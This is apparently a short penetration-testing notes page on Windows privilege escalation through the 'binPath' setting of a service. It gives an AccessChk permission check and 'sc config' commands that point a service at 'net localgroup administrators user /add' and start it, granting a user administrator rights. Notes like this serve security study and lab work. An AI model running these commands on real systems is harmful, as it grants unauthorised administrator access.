---
icon: binary
---

# binPath

For this method, we must have the SERVICE\_CHANGE\_CONFIG permission for the service we are trying to attack. We can use the AccessChk tool for this:

{% embed url="https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk" %}

```bash
AccessChk -wuvc [service]

# insert out malicious command:
sc config [service] binpath= "net localgroup administrators user /add"
sc start [service]
```
